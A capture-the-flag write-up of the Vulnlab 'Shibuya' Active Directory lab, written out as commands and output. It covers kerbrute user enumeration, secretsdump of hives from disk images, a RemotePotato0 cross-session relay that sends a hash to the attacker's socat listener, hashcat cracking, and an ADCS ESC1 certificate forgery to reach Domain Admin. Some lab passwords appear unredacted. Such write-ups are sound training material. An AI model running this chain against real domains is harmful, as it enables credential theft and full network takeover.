---
title: "Vulnlab - Shibuya"
date: 2025-02-28 12-23-00
image: /assets/img/post_covers/shibuya.jpg
categories: [CTF]
tags: [Active Directory, Windows, Vulnlab, cross-session relay, ADCS]
---

# Enumeration
Given the IP address and the ports of the machine:
```
22/tcp   open  ssh
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
```
We should notice that there is the **SSH** service and no **LDAP/LDAPS** port exposed, and I will first start with the **SMB Null session + Guest Logon**:

```
nxc smb awsjpdc0522.shibuya.vl -u '' -p '' --shares
SMB         10.10.80.206    445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB         10.10.80.206    445    AWSJPDC0522      [+] shibuya.vl\: 
SMB         10.10.80.206    445    AWSJPDC0522      [-] Error enumerating shares: STATUS_ACCESS_DENIED

nxc smb awsjpdc0522.shibuya.vl -u 'dwgth4i' -p '' --shares 
SMB         10.10.80.206    445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB         10.10.80.206    445    AWSJPDC0522      [-] shibuya.vl\dwgth4i: STATUS_LOGON_FAILURE
```
So none of them work, next I will try to brute forcing username using [Kerbrute](https://github.com/ropnop/kerbrute) userenum module.
```
./kerbrute_linux_amd64 userenum -d shibuya.vl --dc AWSJPDC0522.shibuya.vl /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/27/25 - Ronnie Flathers @ropnop

2025/02/27 21:54:02 >  Using KDC(s):
2025/02/27 21:54:02 >   AWSJPDC0522.shibuya.vl:88

2025/02/27 21:54:05 >  [+] VALID USERNAME:       purple@shibuya.vl
2025/02/27 21:54:10 >  [+] VALID USERNAME:       red@shibuya.vl
```

## Access on precreated machine accounts
Found 2 valid username, at this point we can try for ASREPRoast or Password spraying, I tried both, even with a 5000-line custom wordlist and user=pass pattern. So I stuck here for about 2 days then I asked xct for nudge on this. He said they are precreated computer accounts and this is very common in AD and the reason why I didn't get it is because I didn't add the *$* sign at the end of those two accounts, and also he said on kerberos authentication, the *$* will not matter and that is also the reason why kerbrute fetched these two without *$*.

We can see in the below output, with normal NTLM authentication we got **STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT**, this is because *red$* is a precreated machine account which require us to change its password on the first time using it and with the Kerberos authentication, we hit it easily.
```
nxc smb awsjpdc0522.shibuya.vl -u 'red$' -p 'red'                  
SMB         10.10.80.206    445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB         10.10.80.206    445    AWSJPDC0522      [-] shibuya.vl\red$:red STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT 

 ╭─dwgth4i@kali in ~/tools took 4s
 ╰─λ nxc smb awsjpdc0522.shibuya.vl -u 'red' -p 'red' -k
SMB         awsjpdc0522.shibuya.vl 445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB         awsjpdc0522.shibuya.vl 445    AWSJPDC0522      [+] shibuya.vl\red:red
```
So at this point we can change the password for *red$* and ready to go, because I got no luck with RPC and SMB so I use **kpasswd** to change the password (using this require us to setup the realm in /etc/krb5.conf).
```
[libdefaults]
        default_realm = SHIBUYA.VL

<SNIP>

[realms]
        SHIBUYA.VL = {
                kdc = awsjpdc0522.shibuya.vl
                admin_server = awsjpdc0522.shibuya.vl
                default_domain = shibuya.vl
        }
<SNIP>
```
Then we can use kpasswd.
```
kpasswd red$   
Password for red$@SHIBUYA.VL: 
Enter new password: 
Enter it again: 
Password changed.
```

## RPC
Next, with a valid domain computer account, I enumerating the shares on the SMB and got:
```
nxc smb awsjpdc0522.shibuya.vl -u 'red$' -p 'test' --shares
SMB         10.10.80.206    445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB         10.10.80.206    445    AWSJPDC0522      [+] shibuya.vl\red$:test 
SMB         10.10.80.206    445    AWSJPDC0522      [*] Enumerated shares
SMB         10.10.80.206    445    AWSJPDC0522      Share           Permissions     Remark
SMB         10.10.80.206    445    AWSJPDC0522      -----           -----------     ------
SMB         10.10.80.206    445    AWSJPDC0522      ADMIN$                          Remote Admin
SMB         10.10.80.206    445    AWSJPDC0522      C$                              Default share
SMB         10.10.80.206    445    AWSJPDC0522      images$                         
SMB         10.10.80.206    445    AWSJPDC0522      IPC$            READ            Remote IPC
SMB         10.10.80.206    445    AWSJPDC0522      NETLOGON        READ            Logon server share 
SMB         10.10.80.206    445    AWSJPDC0522      SYSVOL          READ            Logon server share 
SMB         10.10.80.206    445    AWSJPDC0522      users           READ
```
Okay, now we can try to open some shares and read them, looking for some creds or info. After a while of looking, there is nothing informative, we can just note down that there is a images$ share without read permission so we can check that later if we have more access. Next, I head to the rpcclient to further enumerate domain users. One thing I always do with RPC is to get all the potential users and groups that might give some information then query them since the **LDAP/LDAPS** are not exposed so we can not get Bloodhound data.
```
rpcclient $> enumdomusers
user:[_admin] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[svc_autojoin] rid:[0x453]
user:[Leon.Warren] rid:[0x455]
user:[Graeme.Kerr] rid:[0x456]
user:[Joshua.North] rid:[0x457]
user:[Shaun.Burton] rid:[0x458]
user:[Gillian.Douglas] rid:[0x459]
user:[Kelly.Davies] rid:[0x45a]
user:[Conor.Fletcher] rid:[0x45b]
user:[Karl.Brown] rid:[0x45c]
user:[Tracey.Wood] rid:[0x45d]
user:[Mohamed.Brooks] rid:[0x45e]
user:[Wendy.Stevenson] rid:[0x45f]
user:[Gerald.Allen] rid:[0x460]
user:[Leigh.Harrison] rid:[0x461]
user:[Brian.Elliott] rid:[0x462]
user:[Ashleigh.Hancock] rid:[0x463]
user:[Kevin.Green] rid:[0x464]
user:[Mathew.Richardson] rid:[0x465]
user:[Stanley.Johnson] rid:[0x466]
user:[Sophie.Smith] rid:[0x467]
user:[Thomas.Wilson] rid:[0x468]
user:[Jacqueline.Taylor] rid:[0x469]
user:[Georgia.Smith] rid:[0x46a]
user:[Georgia.Kelly] rid:[0x46b]
user:[Alan.Green] rid:[0x46c]
user:[Mohammad.Todd] rid:[0x46d]
user:[Graham.Francis] rid:[0x46e]
user:[Elaine.Roberts] rid:[0x46f]
user:[Ross.Allen] rid:[0x470]
user:[Grace.Humphries] rid:[0x471]
user:[Roy.Shepherd] rid:[0x472]
user:[Emma.Noble] rid:[0x473]
user:[Ryan.Harris] rid:[0x474]
user:[Suzanne.Webb] rid:[0x475]
user:[Edward.Smith] rid:[0x476]
user:[Ellie.Chapman] rid:[0x477]
user:[Bradley.Evans] rid:[0x478]
user:[Grace.King] rid:[0x479]
user:[Eric.Barnes] rid:[0x47a]
user:[Tracey.Holmes] rid:[0x47b]
user:[Joan.White] rid:[0x47c]
user:[Leslie.Osborne] rid:[0x47d]
<SNIP>
```
We can see that there are so many users in this domain so we need to narrow the scope of searching, lets check the domain groups:
```
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[t1_admins] rid:[0x44f]
group:[t2_admins] rid:[0x450]
group:[t0_admins] rid:[0x451]
group:[shibuya] rid:[0x454]
group:[ssh] rid:[0xc1d]
group:[t3_admins] rid:[0x1005]
```
Okay, now it is clearer, lets target for groups like t0_admins, t1_admins, t2_admins, t3_admins, ssh because they are not standard or default groups in the domain, after a while of searching, I got a map right here to make it more visualize
```
Domain
│
├── t0_admins
│   ├── Lesley.Lynch
│   ├── Leon.Wells
│
├── t1_admins (member of ssh)
│   ├── Norman.Clayton
│   ├── Nigel.Mills
│   ├── [SSH Access]
│
├── t2_admins (member of ssh)
│   ├── Paula.Davies
│   ├── Simon.Watson
│   ├── [SSH Access]
│
└── t3_admins
    ├── svc_autojoin
``` 
What is more is when query the user svc_autojoin, in the description of this service user, we will get a random string looks like a password
```
rpcclient $> queryuser 0x453
        User Name   :   svc_autojoin
        Full Name   :   svc_autojoin
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   K5&<REDACTED>KWhV
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Wed, 31 Dec 1969 16:00:00 PST
        Logoff Time              :      Wed, 31 Dec 1969 16:00:00 PST
        Kickoff Time             :      Wed, 13 Sep 30828 19:48:05 PDT
        Password last set Time   :      Fri, 14 Feb 2025 23:51:49 PST
        Password can change Time :      Sat, 15 Feb 2025 23:51:49 PST
        Password must change Time:      Wed, 13 Sep 30828 19:48:05 PDT
        unknown_2[0..31]...
        user_rid :      0x453
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...
```
# Initial Access
```
nxc smb awsjpdc0522.shibuya.vl -u svc_autojoin -p 'K5&<REDACTED>KWhV' --shares                      
SMB         10.10.114.33    445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB         10.10.114.33    445    AWSJPDC0522      [+] shibuya.vl\svc_autojoin:K5&A6Dw9d8jrKWhV 
SMB         10.10.114.33    445    AWSJPDC0522      [*] Enumerated shares
SMB         10.10.114.33    445    AWSJPDC0522      Share           Permissions     Remark
SMB         10.10.114.33    445    AWSJPDC0522      -----           -----------     ------
SMB         10.10.114.33    445    AWSJPDC0522      ADMIN$                          Remote Admin
SMB         10.10.114.33    445    AWSJPDC0522      C$                              Default share
SMB         10.10.114.33    445    AWSJPDC0522      images$         READ            
SMB         10.10.114.33    445    AWSJPDC0522      IPC$            READ            Remote IPC
SMB         10.10.114.33    445    AWSJPDC0522      NETLOGON        READ            Logon server share 
SMB         10.10.114.33    445    AWSJPDC0522      SYSVOL          READ            Logon server share 
SMB         10.10.114.33    445    AWSJPDC0522      users           READ
```
Now we can confirm that this cred is valid and now as the new user, we can read the images$ share, let's dive in and download all the files back to our machine
```
smbng --host 10.10.114.33 -u svc_autojoin -p 'K5&<REDACTED>KWhV' --timeout 30
               _          _ _            _                    
 ___ _ __ ___ | |__   ___| (_) ___ _ __ | |_      _ __   __ _ 
/ __| '_ ` _ \| '_ \ / __| | |/ _ \ '_ \| __|____| '_ \ / _` |
\__ \ | | | | | |_) | (__| | |  __/ | | | ||_____| | | | (_| |
|___/_| |_| |_|_.__/ \___|_|_|\___|_| |_|\__|    |_| |_|\__, |
    by @podalirius_                             v2.1.7  |___/  
    
[+] Successfully authenticated to '10.10.114.33' as '.\svc_autojoin'!
■[\\10.10.114.33\]> use images
[error] No share named 'images' on '10.10.114.33'
■[\\10.10.114.33\]> use images$
■[\\10.10.114.33\images$\]> ls
d-------     0.00 B  2025-02-16 03:24  .\
d--h--s-     0.00 B  2025-02-19 04:59  ..\
-a------    7.88 MB  2025-02-16 03:24  AWSJPWK0222-01.wim
-a------   48.31 MB  2025-02-16 03:24  AWSJPWK0222-02.wim
-a------   30.58 MB  2025-02-16 03:24  AWSJPWK0222-03.wim
-a------  357.12 kB  2025-02-16 03:24  vss-meta.cab
■[\\10.10.114.33\images$\]> get *
```
We got some Windows image files, after a while of harvesting, one of the images will give us all the important hives so that we can perform a credentials dump with secretsdump
```
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL    
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: <REDACTED>
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:<REDACTED>:<REDACTED>:::
Guest:501:<REDACTED>:<REDACTED>:::
DefaultAccount:503:<REDACTED>:<REDACTED>:::
WDAGUtilityAccount:504:<REDACTED>:<REDACTED>:::
operator:1000:aad3b435b51404eeaad3b435b51404ee:5d8c3d1a20b<REDACTED>763ca0d50:::
[*] Dumping cached domain logon information (domain/username:hash)
SHIBUYA.VL/Simon.Watson:$DCC2$10240#Simon.Watson#04b20c71<REDACTED>0b3409e325: (2025-02-16 11:17:56)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:<REDACTED>
$MACHINE.ACC: <REDACTED>:1fe837c138d<REDACTED>3239cd3cb42
<SNIP>
```
With this info, I recalled there is another domain machine account which is **AWSJPWK0222$**, then I tried the NTLM hash of $MACHINE.ACC then got a hit (this is just informative, not so helpful). But the important thing is that the user Simon.Watson is also on this machine and gave us the domain cache credential, this was not crackable.

Looking back, there is a user **operator** on this machine, this might be Simon.Watson local account, so in my first guess, I got Simon.Watson.
```
nxc smb awsjpdc0522.shibuya.vl -u simon.watson -H 5d8c3d1a20b<REDACTED>f6763ca0d50                 
SMB         10.10.114.33    445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)
SMB         10.10.114.33    445    AWSJPDC0522      [+] shibuya.vl\simon.watson:5d8c3d1a20b<REDACTED>f6763ca0d50
```
Now to get access on the machine, remember that we have SSH service on this machine and the **users** share, I will use *ssh-keygen* and put the public key on the Simon.Watson .ssh folder on the share -> we can ssh into the machine with the private key.

![image](https://github.com/user-attachments/assets/774db87e-4e45-40df-941c-430f00ae90bc)
# Privilege Escalation
At this point, I will gather all the information on the domain with SharpHound for BloodHound data on the machine since the **LDAP/LDAPS** ports are blocked, or we could use other collectors through socks.

My BloodHound didn't show the HasSession at first, apparently with the collect method *all* is not enough, I tried almost everything to find the next attack vector. I asked serioton on Vulnlab Discord channel for a hint, turns out his collector also missed this, so to be able to move on, I ran the SharpHound again with the parameter **-c all,LoggedOn**, now we got the actual enough information.

![image](https://github.com/user-attachments/assets/727d5924-5f2d-4051-8d22-df30d4aa9d5d)

So there is a user Nigel.Mills, who is also currently having a session on the machine, to abuse this, I tried keylogging stuff, but didn't work, almost everything got flagged by defender, one more thing we could try is cross-session relay with [RemotePotato](https://github.com/antonioCoco/RemotePotato0), you would be familiar with this if you have done Rebound from HTB.
```
PS C:\Users\simon.watson> .\RemotePotato0.exe -m 2 -s 1 -x 10.8.4.152 -p 9999 
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 9999
[*] Example Network redirector: 
        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:9999
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ... 
[*] RPC relay server listening on port 9997 ...
[*] IStoragetrigger written: 102 bytes
[*] ServerAlive2 RPC Call
[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 9999
[+] User hash stolen!

NTLMv2 Client   : AWSJPDC0522
NTLMv2 Username : SHIBUYA\Nigel.Mills
NTLMv2 Hash     : Nigel.Mills::SHIBUYA:1995622f5244d1a0:94de8a8d873c785d9fd1d023ac98f9a7:<REDACTED>
```
Remember to run socat first on attacker machine
```
udo proxychains socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.79.39:9999
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.79.39:9999  ...  OK
> 2025/02/27 06:41:17.000849661  length=116 from=0 to=115
..\v.....t...........................`R.......!4z.....]........\b.+.H`............`R.......!4z....,..l..@E............< 2025/02/27 06:41:18.000070358  length=84 from=0 to=83
..\f.....T............QF...9999...........]........\b.+.H`............................> 2025/02/27 06:41:18.000291453  length=24 from=116 to=139
........................< 2025/02/27 06:41:18.000528213  length=40 from=84 to=123
........(...............................[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.79.39:9999  ...  OK
> 2025/02/27 06:41:19.000198989  length=120 from=0 to=119
..\v\a....x.(..........QF.............`R.......!4z.....]........\b.+.H`....
.......NTLMSSP.......\b.................
.|O....< 2025/02/27 06:41:19.000441744  length=294 from=0 to=293
..\f\a....&............QF...9999...........]........\b.+.H`....
.......NTLMSSP.........8..........Y................F...
.|O....S.H.I.B.U.Y.A.....S.H.I.B.U.Y.A.....A.W.S.J.P.D.C.0.5.2.2.....s.h.i.b.u.y.a...v.l...,.A.W.S.J.P.D.C.0.5.2.2...s.h.i.b.u.y.a...v.l.....s.h.i.b.u.y.a...v.l.\a.\b.....%.......> 2025/02/27 06:41:19.000666000  length=614 from=120 to=733
...\a................
.......NTLMSSP.............@.@.........X.......f.......|...............
.|O......D.x.........&.S.H.I.B.U.Y.A.N.i.g.e.l...M.i.l.l.s.A.W.S.J.P.D.C.0.5.2.2............................TU.S...Z..4,-............%...V..Y9.g.........S.H.I.B.U.Y.A.....A.W.S.J.P.D.C.0.5.2.2.....s.h.i.b.u.y.a...v.l...,.A.W.S.J.P.D.C.0.5.2.2...s.h.i.b.u.y.a...v.l.....s.h.i.b.u.y.a...v.l.\a.\b.....%...........\b.0.0............ ......>...7...`..-.._...K....VF.N.
...................     . .R.P.C.S.S./.1.0...8...4...1.5.2.........F.......J.....%)........P...............&~.....`........\a...............
.............;...#y....< 2025/02/27 06:41:19.000915725  length=32 from=294 to=325
........ ....... ...............[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.79.39:9999  ...  OK
> 2025/02/27 06:41:20.000577111  length=72 from=0 to=71
..\v.....H............QF.............`R.......!4z.....]........\b.+.H`....< 2025/02/27 06:41:20.000797727  length=60 from=0 to=59
..\f.....<............QF...9999.`.........]........\b.+.H`....> 2025/02/27 06:41:21.000016776  length=42 from=72 to=113
........*...............&~.....`........\a.< 2025/02/27 06:41:21.000252301  length=108 from=60 to=167
........l.......T...................\a.1.2.7...0...0...1.[.9.9.9.7.].....
...........""33DDUUUUUU......\a.....%
```
With the NetNTLMv2 hash we got from Nigel.Mills, we can perform offline attack and get the password in plaintext.
```
hashcat nigel.hash /usr/share/wordlists/rockyou.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

NIGEL.MILLS::SHIBUYA:1995622f5244d1a0:94de8a8d873c785d9fd1d023ac98f9a7:<REDACTED>:Sa<REDACTED>
```
# ADCS Attack mismatch SID
After the whole process of enumeration, I found that there is ADCS installed on the AD server and another thing is, there are vulnerable certificates that we could use this to get a quick win
```
proxychains certipy find -u nigel.mills@shibuya.vl -dc-ip 10.10.114.33 -ns 10.10.114.33 -p <REDACTED> -vulnerable -stdout
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.114.33:636  ...  OK
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'shibuya-AWSJPDC0522-CA' via CSRA
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.114.33:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.114.33:58258  ...  OK
[!] Got error while trying to get CA configuration for 'shibuya-AWSJPDC0522-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'shibuya-AWSJPDC0522-CA' via RRP
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.114.33:445  ...  OK
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'shibuya-AWSJPDC0522-CA'
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.114.33:80  ...  OK
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : shibuya-AWSJPDC0522-CA
    DNS Name                            : AWSJPDC0522.shibuya.vl
    Certificate Subject                 : CN=shibuya-AWSJPDC0522-CA, DC=shibuya, DC=vl
    Certificate Serial Number           : 2417712CBD96C58449CFDA3BE3987F52
    Certificate Validity Start          : 2025-02-15 07:24:14+00:00
    Certificate Validity End            : 2125-02-15 07:34:13+00:00
    Web Enrollment                      : Enabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SHIBUYA.VL\Administrators
      Access Rights
        ManageCertificates              : SHIBUYA.VL\Administrators
                                          SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        ManageCa                        : SHIBUYA.VL\Administrators
                                          SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        Enroll                          : SHIBUYA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue
Certificate Templates
  0
    Template Name                       : ShibuyaWeb
    Display Name                        : ShibuyaWeb
    Certificate Authorities             : shibuya-AWSJPDC0522-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Any Purpose
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 100 years
    Renewal Period                      : 75 years
    Minimum RSA Key Length              : 4096
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SHIBUYA.VL\t1_admins
                                          SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : SHIBUYA.VL\_admin
        Write Owner Principals          : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
                                          SHIBUYA.VL\_admin
        Write Dacl Principals           : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
                                          SHIBUYA.VL\_admin
        Write Property Principals       : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
                                          SHIBUYA.VL\_admin
    [!] Vulnerabilities
      ESC1                              : 'SHIBUYA.VL\\t1_admins' can enroll, enrollee supplies subject and template allows client authentication
      ESC2                              : 'SHIBUYA.VL\\t1_admins' can enroll and template can be used for any purpose
      ESC3                              : 'SHIBUYA.VL\\t1_admins' can enroll and template has Certificate Request Agent EKU set

```
So let just continue the attack with certipy and get Domain Admin user since there is ESC1, right? But remember the real DA is not *Administrator*, it is *_admin*.

![image](https://github.com/user-attachments/assets/4623ed26-9082-4db3-8ce9-7560c6a4fcd2)

```
proxychains certipy req -u nigel.mills@shibuya.vl -dc-ip 10.10.114.33 -ns 10.10.114.33 -p Sail2Boat3 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn '_admin@shibuya.vl'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.114.33:445  ...  OK
[-] Got error while trying to request certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template.
[*] Request ID is 4
Would you like to save the private key? (y/N) N
[-] Failed to request certificate
```
Okay, we can see the key size is not enough, the default is **2048**, we can specify the flag **-key-size** and put the value **4096** and try again
```
proxychains certipy req -u nigel.mills@shibuya.vl -dc-ip 10.10.114.33 -ns 10.10.114.33 -p Sail2Boat3 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn '_admin@shibuya.vl' -key-size 4096
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.114.33:445  ...  OK
[*] Successfully requested certificate
[*] Request ID is 6
[*] Got certificate with UPN '_admin@shibuya.vl'
[*] Certificate has no object SID
[*] Saved certificate and private key to '_admin.pfx'
```
Nice, now just one more step then we PWNED the domain.
```
certipy auth -pfx _admin.pfx -dc-ip 10.10.114.33
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: _admin@shibuya.vl
[*] Trying to get TGT...
[-] Object SID mismatch between certificate and user '_admin'
```
Oops! Seems like this is not fine at all. But, just lucky that I found this [post](https://x.com/unsigned_sh0rt/status/1894569834400420241), now we can just do it again, specify the SID using **-sid** from certipy then we are good.
```
proxychains certipy req -u nigel.mills@shibuya.vl -dc-ip 10.10.114.33 -ns 10.10.114.33 -p Sail2Boat3 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn '_admin@shibuya.vl' -key-size 4096 -sid 'S-1-5-21-87560095-894484815-3652015022-500'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.114.33:445  ...  OK
[*] Successfully requested certificate
[*] Request ID is 8
[*] Got certificate with UPN '_admin@shibuya.vl'
[*] Certificate object SID is 'S-1-5-21-87560095-894484815-3652015022-500'
[*] Saved certificate and private key to '_admin.pfx'

certipy auth -pfx _admin.pfx -dc-ip 10.10.114.33
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: _admin@shibuya.vl
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to '_admin.ccache'
[*] Trying to retrieve NT hash for '_admin'
[*] Got hash for '_admin@shibuya.vl': aad3b435b51404eeaad3b435b51404ee:<REDACTED>
```
# Conclusion
A really nice machine, especially at the starting point, as one of my favorite red teamer said, the box is good/fun only when there is something or some small features that we can learn. 
